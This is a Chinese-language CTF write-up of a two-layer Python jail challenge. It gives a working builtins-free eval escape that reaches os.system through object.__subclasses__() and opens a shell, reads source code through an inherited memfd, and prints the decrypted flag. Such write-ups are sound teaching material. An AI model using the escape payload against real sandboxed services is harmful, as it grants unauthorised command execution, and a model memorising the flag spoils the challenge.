# Jail大逃亡

## 题目简述

题目由两层 Python Jail 组成。第一层直接对用户输入执行 `eval`，但把 `__builtins__` 设为 `None`，需要从现有对象的继承关系中重新取得命令执行能力；进入第二层后，服务进程又将自身源码写入 memfd，并把磁盘上的读取权限收紧，因此还要利用子进程继承的文件描述符取回源码。源码最终给出一组 AES-CBC 参数，解密后即可得到 flag。

## 解题过程

### 第一关：从对象继承链取回 `system`

第一层的核心代码等价于：

```python
result = eval(player_input, {"__builtins__": None}, {})
```

虽然内建函数不可直接使用，但字面量对象仍然能够访问 Python 的类型系统。`''.__class__` 是 `str`，其基类 `''.__class__.__base__` 是 `object`，调用 `object.__subclasses__()` 可以枚举当前解释器中已经加载的类。

其中 `os._wrap_close` 的 `__init__` 是 Python 函数，`__init__.__globals__` 指向定义该函数时的模块全局字典。该字典中包含 `os.system`，因此可用类名筛选 `_wrap_close` 并执行 shell：

```python
[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0]["system"]("sh")
```

这里利用的不是某个固定的 subclass 下标，而是按类名查找，所以比依赖当前 Python 版本中的类序号更稳定。

### 第二关：读取继承的 memfd

第二层服务启动时调用 `os.memfd_create("main")` 创建匿名内存文件，把自身源码写入其中，再以如下方式启动子进程：

```python
subprocess.Popen(
    ["python3", f"/proc/self/fd/{self_fd}", "fork"],
    pass_fds=[self_fd],
    cwd=pwd,
    env=os.environ,
)
```

`pass_fds` 明确把 memfd 传给了子进程。子进程随后即使降权到 UID `65534`，已经打开的文件描述符仍然有效；文件被标记为 `(deleted)` 或权限被改为 `0400`，也不会撤销进程已经持有的描述符。因此，拿到 shell 后先查看进程参数，确定实际的 FD 编号：

```text
$ ps aux
USER       PID  COMMAND
root         1  python3 main.py
nobody       7  python3 /proc/self/fd/4 fork
```

本次实例中编号为 `4`，实际利用时应以 `ps` 输出为准。将文件偏移重置到开头，再通过该描述符读取源码：

```bash
python3 -c "import os; os.lseek(4, 0, 0); print(os.read(4, 90000).decode('latin1', errors='ignore'))"
```

恢复出的源码中，`flag_hint()` 给出了完整的密钥、初始向量和密文：

```python
def flag_hint():
    print("there are some important information for you")
    key = "49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93"
    IV = "MEOHeAiC+BlLhH3FKhl0MQ=="
    Ciphertext = "j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9"
    print("that's all,have fun!!!")
```

### AES-CBC 解密

`key` 是 32 字节十六进制数据，对应 AES-256；`IV` 和 `Ciphertext` 均为 Base64 编码。按 CBC 模式解密并移除 PKCS#7 填充：

```python
import base64

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = bytes.fromhex(
    "49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93"
)
iv = base64.b64decode("MEOHeAiC+BlLhH3FKhl0MQ==")
ciphertext = base64.b64decode(
    "j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9"
)

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
print(plaintext.decode())
```

输出为：

```text
0xGame{Contratulations!You_solved_pyjail!}
```

因此 flag 为 `0xGame{Contratulations!You_solved_pyjail!}`。

## 方法总结

本题将 Python 对象模型逃逸与 Linux 文件描述符语义串在一起。第一关的关键是：禁用 `__builtins__` 不等于切断所有能力，只要可访问现有对象，就可能经 `object.__subclasses__()` 找到带有模块全局变量的 Python 类；第二关的关键是：权限位和路径状态约束的是后续打开操作，无法使已经打开且被 `pass_fds` 继承的描述符失效。恢复源码后再根据编码方式和密钥长度识别 AES-256-CBC，完成最后的常规解密即可。
